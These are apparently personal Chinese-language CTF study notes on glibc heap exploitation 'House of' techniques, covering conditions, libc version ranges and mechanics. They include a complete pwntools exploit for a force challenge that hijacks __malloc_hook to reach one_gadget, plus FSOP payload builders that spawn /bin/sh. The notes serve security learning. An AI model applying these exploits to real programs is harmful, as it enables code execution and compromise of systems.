### <font style="color:#2F8EF4;"></font><font style="color:rgb(36, 41, 47);">House of Botcake</font>
<font style="color:rgb(36, 41, 47);"> 给我们高版本 libc 下的 </font><font style="color:#DF2A3F;">Tcache Double Free</font>

<font style="color:rgb(36, 41, 47);"></font>

#### <font style="color:rgb(36, 41, 47);">使用条件</font>
<font style="color:rgb(36, 41, 47);">存在uaf</font>

<font style="color:rgb(36, 41, 47);">2.27---2.31</font>

<font style="color:rgb(36, 41, 47);"></font>

#### <font style="color:rgb(36, 41, 47);">原理：</font>
<font style="color:rgb(36, 41, 47);">感觉就是高级的Double Free</font>

<font style="color:rgb(36, 41, 47);">进入tcache里面的堆块会自动生成一个key对应堆块，再次申请时会有一个key进行检查</font>

<font style="color:rgb(36, 41, 47);">防止在tcache里面的堆块发生Double Free</font>

<font style="color:rgb(36, 41, 47);">House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制</font>

<font style="color:rgb(36, 41, 47);">同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能</font>

<font style="color:rgb(36, 41, 47);"></font>

### <font style="color:rgb(36, 41, 47);">House of Roman</font>
#### 使用条件
<font style="color:#DF2A3F;">2.23----2.29</font>

<font style="color:#DF2A3F;">存在Double Free，以及   堆溢出   和  offbyone</font>

没有show功能的时候使用



#### 简述过程
先申请一个大于fastbin的堆块（chunk_1），通过堆溢出将（chunk_1）的size改，

再弄两个fastbin，通过改fastbin的地址，让他们指向chunk_1，然后进行改成malloc_hook

的地址，同时将其fd指针置空，再改size为进行free再次进入unsortedbin，再改fd指针指向onegadget





#### 直接上题目的脚本
[exp_debug.py](https://www.yuque.com/attachments/yuque/0/2025/py/54555654/1744887039614-e5e14d09-de0f-4541-8840-e95445f68c22.py)

<font style="color:#2F8EF4;">本题目存在offbyone和double  free</font>

name = b"A"*20

p.recvuntil(":")

p.sendline(name)



create(0x18,0) # 0x20

create(0xc8,1) # d0

create(0x68,2)  # 0x70

<font style="color:#2F8EF4;">申请三个堆块，留着用</font>

<font style="color:#2F8EF4;"></font>

fake = b"A"*0x68+p8(0x61)

edit(1,fake)

<font style="color:#2F8EF4;">在chunk_1里面布置好风水</font>



free(1)

<font style="color:#2F8EF4;">chunk_1在unsortedbin</font>

create(0xc8,1)

<font style="color:#2F8EF4;">将chunk_1再申请回来，由于double  free的存在，fd指针还存在</font>



create(0x68,3)  # b

create(0x68,15)

create(0x68,18)



over = b"A"*0x18  

over += b"\x71" 

edit(0,over)

<font style="color:#2F8EF4;">offbyone该chunk_1的size（在后面更改chunk_2地址的时候不会报错）</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#DF2A3F;">下面开始进行roman</font>

free(2)

free(3)

<font style="color:#2F8EF4;">弄两个fastbin</font>

<font style="color:#2F8EF4;">此时fastbin里面指向如下</font>

<font style="color:#2F8EF4;">chunk_3--->chunk_2</font>



heap_po = b"\x20"

edit(3,heap_po)

<font style="color:#2F8EF4;">更改chunk_2地址的最后一字节</font>



malloc_hook_nearly = b"\xed\x1a"

edit(1,malloc_hook_nearly)

<font style="color:#2F8EF4;">修改chunk_1中的</font><font style="color:#2F8EF4;">main_arena+88的地址为malloc_hook-0x23的地方</font>



然后进行申请堆块将malloc_hook-0x23地方申请出来



free(15)     <font style="color:#2F8EF4;">（malloc_hook-0x23)</font>

edit(15,p64(0x00))

info("再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin")



<font style="color:#2F8EF4;">把malloc_hook堆块的size改回去</font>

<font style="color:#2F8EF4;">然后进行free，堆块就会有libc地址，再进行更改libc为onegadget就可以了</font>



### house  of  froce
#### 原理
<font style="color:#2F8EF4;">在2.23和2.27的libc版本中，由于没有对</font><font style="color:#E4495B;">top chunk的size</font><font style="color:#2F8EF4;">合法性进行检查，因此如果我们能够</font><font style="color:#E4495B;">控制top chunk的size位以及malloc在申请堆块时的大小不受限制（条件）</font><font style="color:#2F8EF4;">，那么就可以完成该攻击。</font>

<font style="color:#2F8EF4;">公式：</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"> new_top的地址 到 0x404060，现在要让0x404060-0x20 =old_top的地址(0x405110) + size ,所以这个 size 应该是 0x404040-0x405110=0xffffffffffffef30</font>

#### 使用条件
<font style="color:#2F8EF4;">1，控制top chunk的size位（堆溢出）</font>

<font style="color:#2F8EF4;">2，申请堆块时不限制大小</font>

<font style="color:#2F8EF4;">3，2.23到2.27版本之间使用</font>

#### <font style="color:#000000;">前置知识</font>
<font style="color:#2F8EF4;">利用realloc函数实现one_gadget的条件</font>

##### <font style="color:#000000;">详细文章</font>
[使用realloc函数来调整栈帧让one_gadget生效 - ZikH26 - 博客园](https://www.cnblogs.com/ZIKH26/articles/16421631.html#_label3)

##### <font style="color:#000000;">理解</font>
<font style="color:#E4495B;">首先</font><font style="color:#2F8EF4;">、realloc函数存在一个__realloc_hook，执行realloc的时候会判断__realloc_hook是否为空，如果不为空，则执行__realloc_hook指向的内容，</font>

<font style="color:#E4495B;">然后</font><font style="color:#2F8EF4;">__realloc_hook和__malloc_hook的地址是挨着的  ，这就意味着我们覆写__malloc_hook的时候可以顺便控制__realloc_hook。</font>

<font style="color:#2F8EF4;">因此我们把__malloc_hook改成__realloc_hook然后__realloc_hook写入one_gaget，最后依然可以执行one_gadget</font>

_<font style="color:#E4495B;">主要原因</font>__<font style="color:rgb(85, 85, 85);">、realloc函数中有大量的</font>__<font style="color:#E4495B;">push指令</font>__<font style="color:rgb(85, 85, 85);">（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。</font>_

<font style="color:#E4495B;">尽量看realloc函数在实现时的汇编</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">例题以及调试</font>
<font style="color:#2F8EF4;">题目：gyctf_2020_force</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#000000;">先上模板</font>

```python
from pwn import *
from struct import pack
import ctypes
context.log_level = 'debug'

p = process('/home/wsq/桌面/force', env={"LD_LIBRARY_PATH": "."})
#p = remote('node4.buuoj.cn', 28626)
libc = ELF('/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda *x: print('\x1b[01;38;5;214m' + ''.join(str(i) for i in x) + '\x1b[0m')

def bug():
    gdb.attach(p)
    

def alloc(size, content):
    p.sendline(b'1')
    p.sendlineafter(b'size\n', str(size))
    p.recvuntil(b'bin addr ')
    addr = int(p.recv(14), 16)
    p.sendafter(b'content\n', content)
    return addr

def puts():
    p.sendlineafter(b'puts\n', b'2')
    
    


bug()
libc_base = alloc(0x2330000, b'a') + 0x2331000 - 0x10+0x100000-0x31000


li(hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x4527a, 0xf03a4, 0xf1247, 0xf1147]
one_gadget = one_gadgets_buu[0] + libc_base

top = alloc(0x10, b'a' * 0x10 + p64(0) + p64(0xffffffffffffffff)) + 0x10

ll("top --> ",hex(top))
ll("malloc_hook - top - 0x30 --->",hex(malloc_hook - top - 0x30))
li(hex(malloc_hook))

addr = alloc(malloc_hook - top - 0x30, b'a')

addr = alloc(0x50, b'a' * 0x8 + p64(one_gadget) + p64(realloc + 0x10))

p.sendlineafter(b'puts\n', b'1')
p.sendlineafter(b'size\n', b'2')

p.interactive()

```

<font style="color:#2F8EF4;"></font>

<font style="color:#000000;">libc_base = alloc(0x2330000, b'a') + 0x2331000 - 0x10+0x100000-0x31000</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">首先，申请的chunk大小不受限制，申请的chunk大小为</font><font style="color:#E4495B;">0x2330000，</font><font style="color:#2F8EF4;">会使堆块的地址挨着libc基址</font>

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745838170505-e606e689-2419-402f-aa5e-5945338909a6.png" width="1072" alt="" title="" crop="0,0,1,1" id="ufff5a7cb" class="ne-image">

<font style="color:#2F8EF4;">也就可以利用该方发泄露libc基址（至少申请</font><font style="color:#E4495B;">0x1fbfe9</font><font style="color:#2F8EF4;">）</font>

<font style="color:#2F8EF4;"></font>

top = alloc(0x10, b'a' * 0x10 + p64(0) + p64(0xffffffffffffffff)) + 0x10

<font style="color:#2F8EF4;">构造top  chunk的size位为</font><font style="color:#E4495B;">0xffffffffffffffff</font><font style="color:#2F8EF4;">，用来绕过检查，同时接收top chunk的</font><font style="color:#E4495B;">头地址</font>

<font style="color:#2F8EF4;"></font>

addr = alloc(malloc_hook - top - 0x30, b'a')

<font style="color:#2F8EF4;">用来使堆的地址变成自己想申请的地址，公式如下   （想申请的地址  -   top chunk  -  0x30）</font>

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745842011537-3ebd83f7-3890-4f6f-898a-d217a368ccae.png" width="603" alt="" title="" crop="0,0,1,1" id="u2b747771" class="ne-image">

addr = alloc(0x50, b'a' * 0x8 + p64(one_gadget) + p64(realloc + 0x10))

<font style="color:#2F8EF4;">填充one_gadget，以及realloc，</font>

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745842101447-7950e9b2-f476-476d-b2f6-e3798935147a.png" width="935" alt="" title="" crop="0,0,1,1" id="ue44c495e" class="ne-image">

<font style="color:#2F8EF4;">realloc_hook里面是one_gadget</font>

<font style="color:#2F8EF4;">malloc_hook里面是realloc函数，</font>

<font style="color:#2F8EF4;">在调用malloc函数的时候会跳到realloc函数，对realloc函数进行检查，realloc函数里面存在one_gadget，进而跳转到one_gadget</font>

<font style="color:#2F8EF4;"></font>

### <font style="color:#000000;">house  of   lore</font>
#### 简述
<font style="color:#E4495B;">利用smallbin，双链表取出堆块</font><font style="color:#2F8EF4;">，其实理解了smallbin的取出堆块的原理基本就会了，</font><font style="color:#E4495B;">一般打got表</font>

#### <font style="color:#000000;">使用条件</font>
<font style="color:#2F8EF4;">1，got表能改</font>

<font style="color:#2F8EF4;">2，文件中存在数据存储（比如说：文件在读入的一些数据会进入bss段）或者能在</font><font style="color:#E4495B;">bss段及data段里面写（用来构造smallbin链表）（也是可以写道栈上的）</font>

<font style="color:#2F8EF4;">3，bss   /  data  存在指向堆的地址，</font>

<font style="color:#2F8EF4;">4，uaf，或者  堆溢出（包括off  by  one）</font>

<font style="color:#2F8EF4;">5，2.23-2.27</font>

#### <font style="color:#000000;">前置知识（含调试）</font>
[https://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/index.html](https://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/index.html)

含有例题和调试



<font style="color:#2F8EF4;">smallbin双链表如何取出堆块，以及步骤。</font>

<font style="color:#2F8EF4;"></font>

##### <font style="color:#000000;">堆块进入samllbin</font>


<font style="color:#000000;">进入smallbin的条件</font>

<font style="color:#2F8EF4;">1，堆块大于0x80     （free后先进入unsortedbin）</font>

<font style="color:#2F8EF4;">2，free后再申请一个大堆块（比如0x400）</font>

<font style="color:#2F8EF4;"></font>

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745920637507-f0b1395b-b330-45f7-972d-7c09d8ebbec9.png" width="1332" alt="" title="" crop="0,0,1,1" id="u2a3fb069" class="ne-image">

<font style="color:#2F8EF4;">第一个堆块进入smallbin</font>

<font style="color:#2F8EF4;">连续两次，两个相同大小的堆块就进入smallbin</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">看指针如下</font>

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745920846299-8c4e4aaa-18df-4d96-ae62-b1c5f243baf1.png" width="708" alt="" title="" crop="0,0,1,1" id="u57d3dc5c" class="ne-image">

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745921118694-f1c9b3c0-dc80-4880-8b15-ee65a861aa8b.png" width="542" alt="" title="" crop="0,0,1,1" id="ue859ec27" class="ne-image">

<font style="color:#2F8EF4;">定义：chunk2（A）--->chunk1（B）---->smallbin【0x100】（libc）---->chunk2（A）</font>

<font style="color:#E4495B;">chunk2的fd--->chunk1，bk--->smallbin[0x110]</font>

<font style="color:#E4495B;">chunk1的fd---->smallbin[0x110],    bk----->chunk2</font>

<font style="color:#E4495B;">smallbin[0x110]第一个指针指向chunk2，</font>

<font style="color:#E4495B;">第二个指针指向chunk1</font>



<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745925901349-14e599d8-ba4a-4c50-9ce7-cf01797473cf.png" width="947" alt="" title="" crop="0,0,1,1" id="u25f5ff2d" class="ne-image">





再次申请与smallbin中大小相同的堆块时，先会检查

<font style="color:#2F8EF4;">B->bk = A</font>

<font style="color:#2F8EF4;">A->bk = libc</font>

<font style="color:#2F8EF4;">libc->fd = A</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

那么我们就可以尝试在内存中伪造堆块<font style="color:#E4495B;">（fake1与fake2共用一个bk指针）</font>



<font style="color:#2F8EF4;">当smallbin中存在     smallbin：A---->libc---->A</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">通过伪造  A  的bk指针---->  fake-0x10</font>

<font style="color:#2F8EF4;">               ~~~fd指针----->  任意</font>

<font style="color:#2F8EF4;">fake的  fd1--->A</font>

<font style="color:#2F8EF4;">fake的  bk1--->自身的地址（fake+0x8)</font>

<font style="color:#2F8EF4;">~~~~  fd2--->任意</font>

<font style="color:#2F8EF4;">~~~~  bk2---->fake-0x10</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">此时的</font>

<font style="color:#2F8EF4;">smallbin：</font>

<font style="color:#2F8EF4;">fd：A--->libc---->A</font>

<font style="color:#2F8EF4;">       fd1--->A</font>

<font style="color:#2F8EF4;">bk：A--->fake-0x10（B）--->bk1（libc）--->A</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">第一次申请   那么走一遍检查</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">此时fake-0x10相当于  libc   也是   B</font>

<font style="color:#E4495B;">B->bk = A          </font><font style="color:#2F8EF4;">  fake-0x10的  bk  为  bk1  --->A</font>

<font style="color:#E4495B;">A->bk = libc       </font><font style="color:#2F8EF4;"> 此时fake-0x10相当于  libc   也是</font>



<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">申请之后的</font>

<font style="color:#2F8EF4;">smallbin：</font>

<font style="color:#2F8EF4;">fd：fd1--->A</font>

<font style="color:#2F8EF4;">bk：fake-0x10--->bk1--->A</font>



<font style="color:#E4495B;">libc ---> fd = B         </font><font style="color:#2F8EF4;"> fd2  --->A</font>

<font style="color:#E4495B;">libc ---> bk = B       </font><font style="color:#2F8EF4;">  bk1  --->A</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">例子</font>
<font style="color:#2F8EF4;">木有找到合适的堆题</font>

<font style="color:#2F8EF4;"></font>

### <font style="color:#000000;">house  of  einherjar</font>
<font style="color:#2F8EF4;">无了个语的，这不就是在offbynull里面用的，来造成堆叠。</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">前置知识</font>
<font style="color:#2F8EF4;">priv_size位记录上一个被free堆块的大小</font>

<font style="color:#2F8EF4;">size位的inuse位记录上一个堆块的状态</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">例子</font>
[从题目学堆叠灵活运用](https://www.yuque.com/zuimopoqingshan/gl5w2l/gi0p68heknlb3qa1)



### <font style="color:#000000;">House of Spirit</font>
<font style="color:#2F8EF4;">fastbin  attack的逆向版本</font>

#### <font style="color:#000000;">凑合看吧</font>
累死了

[好好说话之Fastbin Attack（2）：House Of Spirit-CSDN博客](https://blog.csdn.net/qq_41202237/article/details/109284167)

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">看这个吧，找不到合适的附件</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">ISMMAP位不能为1</font>

<font style="color:#2F8EF4;">inues位为0</font>

<font style="color:#2F8EF4;">size位为0x40</font>

<font style="color:#2F8EF4;">地址要64位：0/8</font>

<font style="color:#2F8EF4;">          32位：0/4  对齐</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">在内存中构造了一个了一个堆块，还要怎么样才能让它   free</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

### <font style="color:#000000;">house  of   rabbit</font>
[House of Rabbit-CSDN博客](https://blog.csdn.net/yjh_fnu_ltn/article/details/141087077)

<font style="color:#2F8EF4;">里面讲述了如何利用该堆块实现堆叠</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">前置知识</font>
**<font style="color:#4861E0;">malloc consolidate（）函数调用的条件</font>**

**<font style="color:#4861E0;"></font>**

**<font style="color:#2F8EF4;"> </font>****<font style="color:#4861E0;">情况 1</font>**<font style="color:#4861E0;">：</font>**<font style="color:#4861E0;">你申请的 chunk 大小 ≥ </font>**`**<font style="color:#4861E0;">fastbin</font>**`**<font style="color:#4861E0;"> 范围</font>**

**<font style="color:#4861E0;"> 情况 2：top chunk 不够用了</font>**

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#000000;">恭喜你</font>

<font style="color:#2F8EF4;">终于可以学打io了，要死的开始！！！</font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

### <font style="color:#000000;">house  of  pig</font>
#### 给学习的网址
[奇安信攻防社区-house of pig与house of pig orw](https://forum.butian.net/share/3887)

[glibc 2.31 pwn——house of pig原题分析与示例程序-CSDN博客](https://blog.csdn.net/qq_54218833/article/details/128575508)



#### <font style="color:rgb(36, 41, 47);">攻击流程</font>
    1. <font style="color:rgb(36, 41, 47);">为tcache stashing unlink attack做准备，tcache中5个，smallbin中2个，大小都为0xa0</font>
    2. <font style="color:rgb(36, 41, 47);">利用largebin泄露libcbase,heapbase。泄露libcbase就是把largebin chunk free后进入unsorted bin，uaf很容易泄露libcbase。泄露heapbase就是再calloc一个比它还大的chunk让它进入largebin，覆盖它的fd,bk，show就是它的fd_nextsize，dbg一看一做差就可以了</font>
    3. <font style="color:rgb(36, 41, 47);">largebin attack向free_hook-0x8处写入一个堆地址，这是为了绕过tcache stashing unlink attack的检查。具体做法是先让一个size大的chunk进入largebin,edit它的bk_nextsize为free_hook-0x28，再让一个size比它小的chunk先进入unsorted bin再链入largebin即可</font>
    4. <font style="color:rgb(36, 41, 47);">再一次largebin attack向_IO_list_all写入一个堆地址，</font>**<font style="color:rgb(36, 41, 47);">要记住这个堆地址，因为我们还要将它申请出来伪造FILE结构</font>**<font style="color:rgb(36, 41, 47);">，方法同上</font>
    5. <font style="color:rgb(36, 41, 47);">tcache stashing unlink attack将free_hook-0x10链入0xa0的chunk大小的tcache中。让修改smallbin的第一个chunk的bk指针修改为free_hook-0x10-0x10，触发tcache stashing unlink attack。注意这里的细节，free_hook-0x8（也就是target+0x8）在之前被修改为了一个堆地址，所以可写，不会引发异常</font>
    6. <font style="color:rgb(36, 41, 47);">在触发tcache stashing unlink attack时，add的时候i要刚好为4，此时刚好malloc(0xe8)。</font>**<font style="color:rgb(36, 41, 47);">在此题中_IO_list_all写入一个堆地址是一个FAKE FILE，但是它的编写受限制，因此将其的*chain指向一个堆地址，再malloc(0xe8)刚好将这个堆地址申请出来，这里才是我们存放_IO_str_overflow的vtable的FAKE FILE!!!</font>**
    7. <font style="color:rgb(36, 41, 47);">在change_role中输入空字符触发len检查调用exit函数，进而执行_IO_str_overflow函数</font>
    8. <font style="color:rgb(36, 41, 47);">exit函数会执行_IO_flush_all_lockp函数来遍历 FILE结构体，而其中就有_IO_str_overflow函数，因此要满足(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)才能让那个if语句执行到_IO_str_overflow</font>
    9. <font style="color:rgb(36, 41, 47);">在_IO_str_overflow函数中malloc,memcpy,free三连（具体细节看源码）old_blen = _IO_blen (fp);new_size = 2 * old_blen + 0x64; malloc (new_size);</font>**<font style="color:rgb(36, 41, 47);">注意这个malloc正是想要malloc出0xa0 chunk大小的tcache头部存的free_hook-0x10</font>**<font style="color:rgb(36, 41, 47);">,因此IO_buf_end，IO_buf_base，要精心设计。memcpy (new_buf, old_buf, old_blen);free (old_buf);</font>**<font style="color:rgb(36, 41, 47);">因此IO_buf_base要刚好是FAKE FILE中/bin/sh\x00的地址（是个堆地址）</font>**
    10. <font style="color:rgb(36, 41, 47);">在写exp的途中要注意修改smallbin的bk指针，largebin中的bk_nextsize指针时如果破坏了要注意修复。同时还要注意各个bin当前的状态不要和预期的状态不一样。也要注意算FILE的偏移要不要0x10这个问题</font>



<font style="color:#2F8EF4;"></font>

### house  of  orange
#### 攻击方式
<font style="color:#DF2A3F;">unsorted bin attack+fsop</font>

#### 使用条件
<font style="color:#DF2A3F;">在没有free且存在堆溢出</font>

#### 范围
<font style="color:#DF2A3F;">2.23-2.27</font>

#### 脚本
主要写fsop的部分

```python
fsop =b'/bin/sh\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段
fsop+=p64(0)+p64(io_list_all-0x10) #old top chunk fd & bk
fsop+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr
fsop+=p64(0)*7
fsop+=p64(leak_heap+0x430)#chain
fsop+=p64(0)*13   #13
fsop+=p64(leak_heap+0x430)  #508   #虚表指向system
fsop+=p64(0)+p64(0)+p64(system)  #最后一个system，为了让程序在跳表时指向shell


payload = p64(system)*0x80    #+ p64(0) + p64(0x21)
#payload+= p64(system) + p64(0)
payload+= fsop
```

第二种

```python
fsop =b'/bin/sh\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段
fsop+=p64(0)+p64(io_list_all-0x10) #old top chunk fd & bk
fsop+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr
fsop+=p64(0)*7
fsop+=p64(leak_heap+0x430)#chain
fsop+=p64(0)
fsop+=p64(leak_heap+0x430)  #_lock
fsop+=p64(0)*11   #11
fsop+=p64(leak_heap+0x430)  #508
fsop+=p64(0)+p64(0)+p64(system)
payload = p64(system)*0x80 #+ p64(0) + p64(0x21)
#payload+= p64(system) + p64(0)
payload+= fsop
```



<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1745494627319-36115b82-7873-4399-bc09-ce181e20aef7.png" width="897" alt="" title="" crop="0,0,1,1" id="u79db2ee6" class="ne-image">



##### 问题
###### p64（0x61）改成其他的可以吗
<font style="color:#2F8EF4;">不可以，0x61，相当于伪造堆块在small  bin，</font>



### house  of  apple2（exit(0)触发io流）
[Largebin Attack原理详解-CSDN博客](https://blog.csdn.net/qq_41252520/article/details/126211062)

这也是吃上细糠了

```python
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

#### <font style="color:#000000;">前置知识</font>
1. <font style="color:#2F8EF4;">为什么用  largebin  attach  往 IO_list_all  里面 写一个堆地址 就可以利用该地址就可以用来伪造  io </font>

<font style="color:#2F8EF4;">     </font><font style="color:#DF2A3F;">我也不知道，暂时知道只要地址合法就可以进行伪造，（堆地址之后就是IO_list_all的结构体）</font>

2. 先知道利用对象是`<font style="color:rgb(102, 102, 102);">_wide_data</font>``<font style="color:rgb(102, 102, 102);">_wide_vtable</font>``<font style="color:rgb(102, 102, 102);">_wide_vtable</font>`<font style="color:rgb(102, 102, 102);">  </font><font style="color:#2F8EF4;">主要是没有检查，我们才进行劫持</font>
3. <font style="color:#2F8EF4;"></font>

```plain
pwndbg> p *_IO_list_all
$2 = {
  file = {
    _flags = -72540025,
    _IO_read_ptr = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_read_end = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_read_base = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_write_base = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_write_ptr = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_write_end = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_buf_base = 0x7ff1eaad7643 <_IO_2_1_stderr_+131> "",
    _IO_buf_end = 0x7ff1eaad7644 <_IO_2_1_stderr_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ff1eaad76a0 <_IO_2_1_stdout_>,
    _fileno = 2,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7ff1eaad87d0 <_IO_stdfile_2_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ff1eaad6780 <_IO_wide_data_2>,//这个变量是我们需要劫持的
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ff1eaad34a0 <_IO_file_jumps>//vtable
}
```

4. 调用  <font style="color:#DF2A3F;">_IO_wifle_overflow--->_IO_wdoallcbuf--->_IO_WDOALLOCATE--->*</font><font style="color:#2F8EF4;">(fp-->_wida_date-->_wida_vtable+0x68)</font><font style="color:#DF2A3F;">(fp)</font>
5. <font style="color:#DF2A3F;"> fp --> _wide_date  --> _IO_buf_base == 0  和  fp --> _flags  &  _IO_UNBUFFERED ==0 </font>

```plain
pwndbg> p _IO_wide_data_2
$4 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _IO_last_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _codecvt = {
    __cd_in = {
      step = 0x0,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    },
    __cd_out = {
      step = 0x0,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    }
  },
  _shortbuf = L"",
  _wide_vtable = 0x7ff1eaad2f60 <_IO_wfile_jumps>
}
```

#### <font style="color:#000000;">使用条件</font>
1. 能够刷新IO流，换言之就是从main函数返回，或者从exit函数退出
2. 能够泄露libc基址和heap地址
3. 使用一次largebin attack既可

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">对fp的要求</font>
1. <font style="color:#DF2A3F;">_flags 设置为~(2|0x8|0x800)，如果不需要控制rdi，设置为0即可；如果需要获得</font>

<font style="color:#DF2A3F;">she11，可设置为"；sh;"</font>

<font style="color:#000000;"></font>

2. <font style="color:#000000;">vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址</font>

<font style="color:#000000;">（加减偏移），使其能成功调用_IO_wfile_overf1ow即可</font>



3. <font style="color:#000000;">_wide_data 设置为可控堆地址A，即满足*(fp + Oxa0) =A</font>



4. <font style="color:#000000;">awide_data->_IO_write_base 设置为0，即满足*(A + 0x18)=0_wide_data->_IO_buf_base 设置为0，即满足*(A+ 0x30)=0 </font>



5. <font style="color:#000000;">_wide_data->_wide_vtabTe 设置为可控堆地址日，即满足*CA +OxeO) =B</font>



6. <font style="color:#000000;">wide_data-_wide_vtab1e->doallocate 设置为地址C用于劫持RIP，即满足*(B+ 0x68) = C</font>

<font style="color:#2F8EF4;"></font>

#### <font style="color:#000000;">脚本</font>
